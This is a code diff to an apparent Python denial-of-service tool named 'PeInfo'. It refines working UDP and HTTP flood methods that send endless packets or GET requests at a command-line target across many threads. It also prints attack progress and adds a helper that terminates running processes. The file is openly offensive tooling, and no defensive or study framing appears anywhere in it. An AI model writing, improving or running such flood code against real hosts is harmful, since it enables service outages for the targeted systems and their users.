@@ -7,6 +7,9 @@ import socket
 import random
 import threading
 import requests
+import os
+import signal
+import psutil
 from colorama import Fore
 from src.help import Help
 
@@ -38,9 +41,9 @@ class DDoS:
                      second = k
 
                self.target = sys.argv[-1]
-               print("PeInfo attacking DDoS with UDP method with target", self.target, "with thread", thread, "and port", port)
+               print("PeInfo attacking DDoS with UDP method with target", self.target, "with thread", thread, "and port", port, f"for {second}s")
                if self.ping_host(self.target):
-                  self.countdown_timer(seconds=int(second))
+                  self.countdown_timer(seconds=int(second), port=int(port), thread=thread)
                   # self.start_udp_flood(port=int(port), threads_count=int(thread))
                break
             else:
@@ -59,9 +62,9 @@ class DDoS:
                      second = k
 
                self.target = sys.argv[-1]
-               print("PeInfo attacking DDoS with TCP method with target", self.target, "with thread", thread, "and port", port)
+               print(Fore.RED, "PeInfo attacking DDoS with TCP method with target", self.target, "with thread", thread, "and port", port)
                if self.ping_host(self.target):
-                  # self.countdown_timer(seconds=int(second))
+                  # self.countdown_timer(seconds=int(second), port=port, thread=thread)
                   self.start_tcp_flood(threads_count=int(thread))
                break
             else:
@@ -73,20 +76,18 @@ class DDoS:
          else:
             Help.exampleUsage()
             break
-
-    def agents(self):
-       f = open("./agent.txt", "r")
-       print(f.read())
           
     def udp_method(self, port):
+      i = 0
       sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      payload = random._urandom(1024)  # Data acak dengan ukuran 1024 byte
+      payload = random._urandom(1024)
       while True:
          try:
             sock.sendto(payload, (self.target, port))
-            print(f"Packet sent to {self.target}:{port}")
+            print(f"{i}. Packet sent to {self.target}: {port}")
          except Exception as e:
-               print(f"Error: {e}")
+            print(f"Error: {e}")
+         i += 1
 
     def start_udp_flood(self, threads_count, port):
       threads = []
@@ -101,14 +102,15 @@ class DDoS:
 
     
     def tcp_method(self):
+       i = 0
        headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
-
        try:
           while True:
-            response = requests.get(self.target, headers=headers)
-            print(f"Status Code: {response.status_code}")
+            response = requests.get(f"https://{self.target}", headers=headers)
+            i += 1
+            print(f"{i}. Packet sent with status code: {response.status_code}")
        except Exception as e:
           print(f"Error: {e}")
 
@@ -123,30 +125,53 @@ class DDoS:
       for thread in threads:
          thread.join()
 
-    def ping_host(self, host:str):
+    def ping_host(self, host):
       try:
-         response = subprocess.run(
-            ["ping", "-c", "1", host],
+         result = subprocess.run(
+            ["ping", "-c", "3", host] if not subprocess.os.name == "nt" else ["ping", "-n", "4", host],
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+            stderr=subprocess.PIPE,
+            text=True
          )
-         
-         if response.returncode == 0:
-            print(f"Host {host} is reachable.")
+         if result.returncode == 0:
+            print(Fore.BLUE, f"Ping to {host} was successful:\n{result.stdout}")
             return True
          else:
-            print(f"Host {host} is not reachable.")
+            print(f"Ping to {host} failed:\n{result.stderr}")
             return False
       except Exception as e:
          print(f"An error occurred: {e}")
          return False
       
-    def countdown_timer(self, seconds):
-      while seconds:
-         mins, secs = divmod(seconds, 60)
-         timer = f'{mins:02}:{secs:02}'
-         print("Time left attacking for", timer, end='\r')
-         time.sleep(1)
-         seconds -= 1
-      print()
-      print(Fore.GREEN, "Attacking complete!")
+    def countdown_timer(self, seconds, port, thread):
+      try:
+         while seconds:
+            mins, secs = divmod(seconds, 60)
+            timer = f'{mins:02}:{secs:02}'
+            print("Time left attacking for", timer, end='\r')
+            time.sleep(1)
+            seconds -= 1
+         if seconds is 0:
+            print()
+            print(Fore.GREEN, "Attacking complete!")
+            sys.exit()
+      except Exception as e:
+         print(f"Error: {e}")
+
+
+    def stop_python_process(self, target_script_name):
+      try:
+         # Iterate over all running processes
+         for proc in psutil.process_iter(attrs=['pid', 'name', 'cmdline']):
+            try:
+               # Check if the process name or command-line matches the target script
+               if target_script_name in proc.info['cmdline']:
+                  print(f"Stopping process {proc.info['name']} with PID {proc.info['pid']}...")
+                  os.kill(proc.info['pid'], signal.SIGTERM)
+                  print("Process terminated successfully.")
+                  return
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+               continue
+         print(f"No process found running the script '{target_script_name}'.")
+      except Exception as e:
+         print(f"An error occurred: {e}")
